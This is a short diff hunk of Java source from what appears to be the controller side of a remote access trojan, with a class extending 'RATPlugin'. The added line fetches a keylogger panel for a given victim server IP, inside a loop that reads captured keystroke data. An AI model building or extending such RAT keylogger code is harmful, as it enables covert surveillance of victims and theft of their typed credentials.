@@ -44,6 +44,8 @@ public class Plugin extends RATPlugin {
 			int len = dis.readInt();
 			System.out.println("Length: " + len);
 			
+			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
+			
 			for (int i = 0; i < len; i++) {
 				boolean isKey = dis.readBoolean();
 
